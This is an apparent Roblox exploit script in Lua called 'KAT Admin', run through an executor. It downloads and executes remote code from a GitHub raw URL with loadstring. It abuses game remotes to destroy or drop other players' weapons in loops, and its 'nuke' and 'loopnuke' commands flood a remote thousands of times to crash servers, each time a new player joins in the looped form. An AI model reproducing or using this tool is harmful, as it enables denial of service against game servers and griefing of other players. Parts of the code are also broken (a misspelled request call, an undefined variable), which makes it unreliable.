local cache = {}
local function getFile(Branch, FileName)
	local FileSplit = string.split(File, ".")
	local FileUrl = "https://raw.githubusercontent.com/forkypine/".. table.concat({Branch or "main", FileName .. (#FileSplit > 1 and "" or ".lua")}, "/")
	
	if not cache[FileUrl] then
		local Data = syn.reqiest({
			Url = FileUrl,
			Method = "GET"
		})
		
		return Data.Body
	else
		return cache[FileUrl]
	end
end

getgenv().loadfile = function(Branch, FileName)
	loadstring(assert(getFile(Branch, FileName), "requested module not found."))
end

local network = loadfile("main", "MainNetwork.lua")
local EData = game.ReplicatedStorage.GameEvents.Data
local tag
local prefixA = ">"
local name
local lrtdplayers = {}
local ParentThing = game.Players.LocalPlayer.PlayerGui:WaitForChild("Chat").Frame.ChatBarParentFrame.Frame.BoxFrame.Frame or script.Parent.Parent.Chat.Frame.ChatBarParentFrame.Frame.BoxFrame.Frame

local CommandInfo = {
	lrt = {Description = "loop removes the specified players tools", Name = "lrt"},
	unlrt = {Description = "stops the loop removal of the specified players tools", Name = "unlrt"},
	help = {Description = "why did you even run this :heh:", Name = "help"},
	trade = {Description = "sends a trade request to the specified player", Name = "trade"},
	nuke = {Description = "crashes the server, highly depends on intensity", Name = "nuke"},
	loopnuke = {Description = "crashes the server every time a new player joins", Name = "loopnuke"},
	playradio = {Description = "plays the specified audio id", Name = "playradio"},
	credits = {Description = "who made the script and tested", Name = "credits"},
	stopradio = {Description = "stops playing the specified audio id", Name = "stopradio"},
	listbackpack = {Description = "lists the players 10 higest rarity items"}, Name = "listbackpackName",
	setprefix = {Description = "changes the command prefix '>' to your desired command prefix", Name = "setprefix"},
	dropknife = {Description = "drops the specified players knife", Name = "dropknifeName"},
	loopdropknife = {Description = "drops the specified players knife", Name = "loopdropknifeName"},
	removetools = {Description = "removes the specified tool from the players inventory"},
	test1 = {Description = "a test command"},
	test2 = {Description = "a test command"},
	message = {Description = "send a message"},
	settag = {Description = "set your exploiterchat tag"},
	setname = {Description = "set your exploiterchat name"},
	tickspeed = {Description = "change the games speed"}
}

local function ConfirmDestruction(plr, weaponName)
	local backpack = plr:FindFirstChild("Backpack")
	local character = plr.Character

	if backpack then
		local weaponInBackpack = backpack:FindFirstChild(weaponName)
		if weaponInBackpack then
			local clientEvent = weaponInBackpack:FindFirstChild("ClientEvent")
			if clientEvent then
				clientEvent:FireServer("ConfirmDestruction", {})
			end
		end
	end

	if character then
		local weaponInCharacter = character:FindFirstChild(weaponName)
		if weaponInCharacter then
			local clientEvent = weaponInCharacter:FindFirstChild("ClientEvent")
			if clientEvent then
				clientEvent:FireServer("ConfirmDestruction", {})
			end
		end

		local workspaceWeapon = character:FindFirstChild(weaponName)
		if workspaceWeapon then
			local clientEvent = workspaceWeapon:FindFirstChild("ClientEvent")
			if clientEvent then
				clientEvent:FireServer("ConfirmDestruction", {})
			end
		end
	end
end

local function deleteWeapons(player, tool)
	if player then
		ConfirmDestruction(player, "Knife")
		ConfirmDestruction(player, "Revolver")
	end
end

local function DeleteTool(player, tool)
	if player then
		ConfirmDestruction(player, tool)
	end
end

local function removeTools(player)
	if lrtdplayers[player.Name] then
		deleteWeapons(player)
	end
end

local function loopDelete(player)
	while lrtdplayers[player.Name] do
		removeTools(player)

		if not lrtdplayers[player.Name] then
			break
		end
		wait(1)
	end
end

local function loopDeleteTool(player, tool)
	while lrtdplayers[player.Name] do
		DeleteTool(player, tool)

		if not lrtdplayers[player.Name] then
			break
		end
		wait(1)
	end
end


local function nukeFunction(intensity)
	local amount = 1 * intensity

	local args = {
		[1] = "ReplicateGearEffect",
		[2] = {
			[1] = {
				["RightArm"] = game:GetService("Players").LocalPlayer.Character:FindFirstChild("Right Arm"),
				["ProjectileDebris"] = workspace.WorldIgnore.Projectiles,
				["Torso"] = game:GetService("Players").LocalPlayer.Character.Torso,
				["WorldIgnore"] = workspace.WorldIgnore,
				["Character"] = game:GetService("Players").LocalPlayer.Character,
				["RenderStepped"] = nil --[[RBXScriptSignal]],
				["Start"] = Vector3.new(-22.707744598388672, 13.920881271362305, -73.56349182128906),
				["Heartbeat"] = nil --[[RBXScriptSignal]],
				["Target"] = Vector3.new(-35.31388473510742, 10.997428894042969, -73.95928955078125),
				["GearModel"] = game:GetService("Players").LocalPlayer.Character.Dice.MoneyBag
			}
		}
	}

	local fireremotebackpack
	local firemote
	local player = game.Players.LocalPlayer

	if player.Backpack then
		local Dice = player.Backpack.Dice
		if Dice then
			fireremotebackpack = Dice.ClientEvent

			for i = 1, amount do
				fireremotebackpack:FireServer(unpack(args))
			end
		else
			local DiceWorkSpace = player.Character.Dice
			if DiceWorkSpace then
				firemote = DiceWorkSpace.ClientEvent

				for i = 1, amount do
					firemote:FireServer(unpack(args))
				end
			end
		end
	end
end

local IsLooping = false

local function loopnukeFunction(enableLoop)
	if enableLoop then
		nukeFunction(6000)
		game.Players.PlayerAdded:Connect(function()
			nukeFunction(10000)
		end)
	elseif not enableLoop then
		print("loop stopped.")
	end
end


local loopedrt = {}

local function SendMessage(Data, tag, name, text)
	print(Data)
	--firesignal(game:GetService("ReplicatedStorage").GameEvents.Misk.Chatted.OnClientEvent, Data, true, true)  
end

local commands = {

	settag = {
		func = function(TagName)
			tag = TagName


			SendMessage({
				TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
				NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
				CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "changed exploiter chat tag to "..TagName},
			})
		end,

		aliases = {"st", "sett"}
	},
	lrt = {
		func = function(playerName)
			local player = game.Players:FindFirstChild(playerName)
			if player then
				lrtdplayers[playerName] = true

				loopDelete(player)

				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "loopedremovedtools for " .. player.Name},
				})
			else
				return nil
			end
		end,
		aliases = {"lt", "loopremovetools"}
	},


	removetools = {
		func = function(player, tool, looped)



			if tool == "revolver" then
				tool = "Revolver"
			elseif tool == "knife" then
				tool = "Knife"
			end


			local ActualName = game.Players:FindFirstChild(player)

			if not ActualName then
				for _, p in ipairs(game.Players:GetPlayers()) do
					if p.Name:lower() == player:lower() then
						player = p
						break
					end
				end
			end

			print(player.Name)

			if player then
				tool = player.Backpack[tool] or player.Character[tool]
				if tool and not looped then
					DeleteTool(player, tool)
				elseif tool and looped then
					loopedrt[player.Name] = true

					loopDeleteTool(player, tool)
				end
			end
		end,

		aliases = {"rt"}
	},


	dupe = {
		func = function(Enabled)

		end,
	},

	playradio = {
		func = function(audioID, volume, looping)
			local soundData = {
				"PlaySound",
				game.Players.LocalPlayer.Name,
				"rbxassetid://" .. tonumber(audioID),
				{workspace},
				tonumber(tonumber(volume)),
				looping
			}

			game.ReplicatedStorage.GameEvents.Misk.PlaySound:FireServer(unpack(soundData))
		end,
		aliases = {"pr"}
	},

	stopradio = {
		func = function()
			local RadioEvent = game.ReplicatedStorage.GameEvents.Misk.ReplicateSoundStop:FireServer()
		end,
		aliases = {"sr"}
	},


	exploiterchat = {
		func = function(message)
			local player = game.Players.LocalPlayer
			local remoteEvent = EData.Parent.Misk.ReplicateSound


		end,
	},

	credits = {
		func = function()
			SendMessage({
				TG = {COL = Color3.fromRGB(255, 255, 0), TXT = "KAT Admin"},
				NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
				CHAT = {COL = Color3.fromRGB(45, 45, 45), TXT = "Script And Ui Were Made By Me (You Know Who You Got This From). Thanks To Amari For Helping Me Test it (mostly, fuck you)"},
			})
		end,
		aliases = {}
	},

	unlrt = {
		func = function(playerName)
			if playerName == "all" or playerName == "All" then
				for _, plr in pairs(game.Players:GetPlayers()) do
					local player = plr.Name
					lrtdplayers[plr.Name] = false

					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "unloopedremovetools for " .. player},
					})
				end
			else
				local player = game.Players:FindFirstChild(playerName)
				if player then
					lrtdplayers[playerName] = false
					loopedrt[playerName] = false	

					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "unloopedremovetools for " .. player.Name},
					})
				end
			end
		end,
		aliases = {"unloopremovetools", "ulrt", "unrt"}
	},

	trade = {
		func = function(playerName)
			local player = game.Players[playerName]
			local fireRemote = game.ReplicatedStorage.GameEvents.Misk.TradeRequest

			fireRemote:FireServer(player.Name)
		end,
		aliases = {}
	},

	nuke = {
		func = function(intensity)
			nukeFunction(tonumber(intensity))

			SendMessage({
				TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
				NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
				CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "nuked the server with an intensity of "..intensity}
			})
		end,

		aliases = {}
	},

	loopnuke = {
		func = function()
			loopnukeFunction(true)

			SendMessage({
				TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
				NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
				CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "loopnuke: enabled"}
			})
		end,
		aliases = {"lnuke", "ln"}
	},

	unloopnuke = {
		func = function()
			loopnukeFunction(false)

			SendMessage({
				TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
				NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
				CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "loopnuke: disabled"}
			})
		end,
		aliases = {"unln", "uln", "ulnuke"}
	},


	setprefix = {
		func = function(prefixChangedTo)
			prefixA = prefixChangedTo
		end,
		aliases = {"sp", "spx", "prefix"}
	},



	dropknife = {
		func = function(player)

			player = game.Players[player]

			if player then
				local char = player.Character

				if char then
					local knife = char:FindFirstChild("Knife")
					if knife then
						local knifeClientEvent = knife:FindFirstChild("ClientEvent")
						if knifeClientEvent then
							knifeClientEvent:FireServer("SetVisible", false)
							wait(0.1)
							knifeClientEvent:FireServer("DropRequest")
						end
					end
				end
			end
		end,
		aliases = {"dk"}
	},

	loopdropknife = {
		func = function(player)

			player = game.Players[player]

			if player then
				local char = player.Character

				if char then
					local knife = char:FindFirstChild("Knife")
					if knife then
						local knifeClientEvent = knife:FindFirstChild("ClientEvent")
						if knifeClientEvent then
							while wait(0.1) do
								knifeClientEvent:FireServer("SetVisible", false)
								wait(0.1)
								knifeClientEvent:FireServer("DropRequest")
							end
						end
					end
				end
			end
		end,
		aliases = {"ldk"}
	},

	test1 = {
		func = function(NameForPlayer)

			local player = game.Players[NameForPlayer]
			EData.RequestDisplayInfo:FireServer(player.Name)


			local Connection; Connection = EData.RequestDisplayInfo.OnClientEvent:Connect(function(p, data)
				if p == player then
					local Items = data.Items
					local ItemS = ""

					for _, v in pairs(Items) do
						ItemS = ItemS .. ":" .. v[1] .. ":"
					end


					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = ":?: " .. p.Name .. ": " .. ItemS}
					})
				end
			end)
		end,
		aliases = {"t1"}
	},
	test2 = {
		func = function(NameForPlayer)

			local player = game.Players[NameForPlayer]
			EData.RequestDisplayInfo:FireServer(player.Name)


			local Connection; Connection = EData.RequestDisplayInfo.OnClientEvent:Connect(function(p, data)
				if p == player then
					local Items = data.Lvl
					local ItemS = ""

					for _, v in pairs(Items) do
						ItemS = ItemS .. ":" .. v[1] .. ":"
					end


					SendMessage({
						TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
						NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
						CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = ":?: " .. p.Name .. ": " .. ItemS}
					})
				end
			end)
		end,

		aliases = {"t2"}
	},


	listbackpack = {
		func = function(player)
			player = game.Players[player]

			if player then
				EData.RequestDisplayInfo:FireServer(player.Name)

				local Connection; Connection = EData.RequestDisplayInfo.OnClientEvent:Connect(function(p, data)
					if p == player then
						local Inv = data.Inventory

						local InvS = ""

						for _, v in pairs(Inv) do
							InvS = InvS .. ":" .. v[1] .. ":"
						end

						SendMessage({
							TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
							NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
							CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = ":?: " .. p.Name .. ": " .. InvS}
						})
					end
				end)
			end
		end,
		aliases = {"lbk", "listinv", "lb", "li"}
	},	


	help = {
		func = function(commands, command)
			local foundCommand = nil

			for cmd, cmdData in pairs(commands) do
				if cmd == command or (cmdData.aliases and table.find(cmdData.aliases, command)) then
					foundCommand = cmd
					break
				end
			end
			if foundCommand then
				local description = CommandInfo[foundCommand].Description
				local aliases = table.concat(commands[foundCommand].aliases or {}, ", ")

				local message = description .. ". Aliases: " .. (aliases ~= "" and aliases or "None")
				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = message},
				})
			else
				SendMessage({
					TG = {COL = Color3.fromRGB(45, 45, 45), TXT = "KAT Admin"},
					NM = {COL = Color3.fromRGB(255, 255, 255), TXT = "System"},
					CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = "Command not found."},
				})
			end
		end,

		aliases = {}
	},

	setname = {
		func = function(Name)
			name = Name
		end,

		aliases = {"sn", "name"}
	},

	tickspeed = {
		func = function(tickSpeed)
			if tonumber(tickSpeed) then
				_G.TICKSPEED = tonumber(tickSpeed)
			end
		end,
	}
}

local function ChatSendMessage(placeName, tag, msg, Data)

	Data = {
		TG = {COL = Color3.fromRGB(45,45,45), TXT = tag or "exploiter chat"},
		NM = {COL = Color3.fromRGB(180,180,180), TXT = placeName or game.Players.LocalPlayer.Name},
		CHAT = {COL = Color3.fromRGB(255, 255, 0), TXT = msg},
	}
	print(Data)
	firesignal(game:GetService("ReplicatedStorage").GameEvents.Misk.Chatted.OnClientEvent, Data, true, true) 
	network.Send("ExploiterChat", Data)
	
	network:BindToTopic("ExploiterChat", function(D)
	firesignal(game:GetService("ReplicatedStorage").GameEvents.Misk.Chatted.OnClientEvent, D, true, true) 
	end)
end





ParentThing.ChatBar.FocusLost:Connect(function(enterPressed)
	local text = ParentThing.ChatBar.Text

	if enterPressed and string.sub(text, 1, 1) == prefixA then
		local command, argumentsStr = text:match(prefixA .. "(%w+)%s*(.*)")

		if command then
			local foundCommand = false
			for cmd, data in pairs(commands) do
				if cmd == command or table.find(data.aliases or {}, command) then
					foundCommand = true
					ParentThing.ChatBar.Text = ""
					local arguments = {}
					for arg in argumentsStr:gmatch("%S+") do
						table.insert(arguments, arg)
					end


					if command ~= "help" then
						data.func(argumentsStr)
						print("Command: " .. command .. ", Arguments: " .. argumentsStr)
					elseif cmd == "help" then
						commands.help.func(commands, argumentsStr)
					end
				end
			end

			if not foundCommand then
				local message = text:match(prefixA .. "%s*(.*)") 

				if message then
					ParentThing.ChatBar.Text = ""
					ChatSendMessage(name, tag, message)
				end
			end
		end
	end
end)

return commands
